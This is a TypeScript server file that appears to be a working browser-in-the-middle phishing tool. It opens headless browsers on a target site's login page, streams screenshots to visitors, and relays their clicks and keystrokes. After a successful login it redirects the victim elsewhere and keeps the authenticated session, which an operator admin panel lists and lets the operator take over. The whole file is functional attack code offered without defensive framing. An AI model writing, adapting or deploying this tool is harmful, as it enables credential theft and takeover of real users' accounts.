import express from "express";
import ws from "ws";
import fs from "fs";
import puppeteer from "puppeteer";

const HOSTNAME = "ws://localhost:8080";
const PORT = 8080;
const ADMIN_PORT = 3333;
const SCREENSHOT_DELAY_TARGET = 150;
const URL_BASE = 'https://<startpagetargetdomain>';
const START_PATH = '/login';
const SUCCESS_URL = "<loggedinurlsuffix>/"; // TODO: Make regex
const REDIRECT_TO = 'https://<redirectdomain>/';
const FREE_PAGE_POOL_SIZE = 3;
const LOG_FILE = "logs.txt";

const app = express();
const adminApp = express();

let logStream = fs.createWriteStream(LOG_FILE, { flags: 'a' });
let freePages: puppeteer.Page[] = [];
let activePages: Map<string, puppeteer.Page> = new Map();
let oldPages: Map<string, puppeteer.Page> = new Map();

ensureFreePagePool();

function log(msg: string) {
  logStream.write(msg + "\n");
  console.log("LOG: " + msg);
}

function ensureFreePagePool() {
  log("ensureFreePagePool");
  (async () => {
    while (freePages.length < FREE_PAGE_POOL_SIZE) {
      let browser = await puppeteer.launch();
      let page = await browser.newPage();
      log("Page created");
      // Try to enable download upon click
      let cdpSession = await page.target().createCDPSession();
      cdpSession.send('Browser.setDownloadBehavior', {
        behavior: 'allow',
        downloadPath: 'downloads',
      });
      await page.goto(URL_BASE + START_PATH);
      log("Navigation complete");
      freePages.push(page);
    }
  })()
}

// https://stackoverflow.com/a/1349426
function makeid(length: number) {
  var result = '';
  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

function archivePage(pageId: string) {
  let page = activePages.get(pageId);
  if (page !== undefined) {
    activePages.delete(pageId);
    oldPages.set(pageId, page);
  } else {
    log("WARN: active page was missing for " + pageId);
  }
}

function sendViewer(pageId: string, isAdmin: boolean, res: any) {
  let data = fs.readFileSync('client.html', 'utf8');
  res.send(data
    .replace("{{PAGE_ID}}", pageId)
    .replace("{{HOST}}", HOSTNAME)
    // Have to use mouse to paste in the text box because we capture all key strokes at document level
    .replace("{{ADMIN_CONTROLS}}", isAdmin ? "<div style='background-color:red;display:flex;justify-content:space-around;'><div><input id='text' type='text' style='width:500;'/><input id='submit' type='submit' value='Go'/></div></div>" : "")
  );
}

function setupScreenshots(socket: ws.WebSocket, pageId: string) {
  setTimeout(() => takeScreenshot(socket, pageId), SCREENSHOT_DELAY_TARGET);
}

function takeScreenshot(socket: ws.WebSocket, pageId: string) {
  let startTime = Date.now();
  let page = activePages.get(pageId);
  if (page !== undefined) {
    page.screenshot({ type: "jpeg", quality: 100 })
      .then((res: Buffer) => {
        socket.send(JSON.stringify({ t: "ss", data: res.toString('base64') }));

        let delay = SCREENSHOT_DELAY_TARGET - (Date.now() - startTime)
        if (delay < 0) {
          delay = 0;
        }
        setTimeout(() => takeScreenshot(socket, pageId), delay);
      }).catch(err => {
        log("Failed to get ss for " + pageId + ": " + err);
      })
  }
}

adminApp.get("/", (req: any, res: any) => {
  let html = "<html>";
  html += "<h1>Admin Panel</h1>";
  html += "<h2>Old Pages</h2>";
  for (const [key, value] of oldPages) {
    html += "<a href='/view/" + key + "'>" + key + "</a><br/>";
  }
  html += "</html>";
  res.send(html);
});

adminApp.get("/view/:id", (req: any, res: any) => {
  sendViewer(req.params.id, true, res);
});

const adminServer = adminApp.listen(ADMIN_PORT, () => {
  log(`admin server started at http://localhost:${ADMIN_PORT}`);
});

app.get("/favicon.ico", (req: any, res: any) => {
  res.sendFile("favicon.ico", { root: __dirname + "/../" });
});

app.get("/check", (req: any, res: any) => {
  res.send("OK");
})

app.get("/*", (req: any, res: any) => {
  log("Received GET at " + req.originalUrl);
  sendViewer(makeid(16), false, res);
});

const wsServer = new ws.Server({ noServer: true });
wsServer.on('connection', socket => {
  let pageId = "waiting"
  socket.on('message', message => {
    let s = new String(message);
    // log("Message received for " + pageId + ": " + s);
    let obj = JSON.parse(s.toString());
    pageId = obj.id
    if (obj.t == "init") {
      let page: puppeteer.Page;
      if (oldPages.has(pageId)) {
        page = oldPages.get(pageId);
        oldPages.delete(pageId);
        activePages.set(pageId, page);
        log("Page " + pageId + " moved from old to active");
      } else if (activePages.has(pageId)) {
        log("Attempted to connect to already-active page " + pageId);
        return;
      } else {
        page = freePages.pop();
        activePages.set(pageId, page);
        page.setViewport({ width: obj.w, height: obj.h });
        // Only used for new pages
        let successChecker = (res: any) => {
          if (page.url().endsWith(SUCCESS_URL)) { // endsWith or includes depending on url; would be better as regex
            log("Was success, redirecting to actual endpoint page " + pageId)
            socket.send(JSON.stringify({ t: "redirect", to: REDIRECT_TO }));
            page.off('response', successChecker);
            archivePage(pageId);
          }
        };
        page.on('response', successChecker);
        log("Grabbed free page for pageId " + pageId);
      }
      if (page === undefined) {
        log("Got undefined page");
      }
      setupScreenshots(socket, pageId);
      page.title()
        .then(res => {
          socket.send(JSON.stringify({ t: "title", title: res }));
        }).catch(err => log("Failed to get title for " + pageId + ": " + err));
      ensureFreePagePool();
    } else if (obj.t == "click") {
      let page = activePages.get(pageId);
      page.mouse.click(obj.x, obj.y);
    } else if (obj.t == "type") {
      let page = activePages.get(pageId);
      page.keyboard.press(obj.k);
    } else if (obj.t == "nav") {
      let page = activePages.get(pageId);
      (async () => {
        await page.goto(obj.url);
        console.log("Navigated to " + obj.url);
      })()
    }
  });
  socket.on('close', server => {
    log("Socket closed removing " + pageId + " from active pages");
    archivePage(pageId);
  })
});

const server = app.listen(PORT, () => {
  log(`server started at http://localhost:${PORT}`);
});
// Allow upgrading to web socket
server.on('upgrade', (request, socket, head) => {
  wsServer.handleUpgrade(request, socket, head, socket => {
    wsServer.emit('connection', socket, request);
  });
});
